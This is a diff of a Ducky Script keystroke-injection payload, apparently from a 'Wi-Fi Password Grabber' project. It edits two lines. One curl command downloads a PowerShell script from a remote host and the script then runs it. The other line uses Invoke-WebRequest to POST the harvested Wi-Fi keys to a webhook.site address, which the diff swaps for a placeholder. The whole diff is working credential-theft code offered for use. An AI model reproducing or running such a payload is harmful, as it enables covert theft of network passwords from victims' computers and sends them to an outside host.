@@ -9,7 +9,7 @@ STRING cd %temp%
 DELAY 500
 ENTER
 DELAY 2000
-STRING curl https://oceanofanythingofficial.github.io/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Powershell-Script -o Wi-Fi.ps1
+STRING curl https://cdn.jsdelivr.net/gh/oceanofanythingofficial/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Powershell-Script.ps1 -o Wi-Fi.ps1
 DELAY 1000
 ENTER
 STRING powershell -File Wi-Fi.ps1
@@ -19,7 +19,7 @@ DELAY 2000
 STRING type Wi-Fi.log > Wi-Fi.key
 DELAY 1000
 ENTER
-STRING powershell Invoke-WebRequest -Uri https://webhook.site/c8e42212-e64b-4bbe-8452-8b8dd92ee43a -Method POST -InFile Wi-Fi.key > Wi-Fi.log
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/your-webhook-api-key -Method POST -InFile Wi-Fi.key > Wi-Fi.log
 DELAY 1000
 ENTER
 DELAY 2000
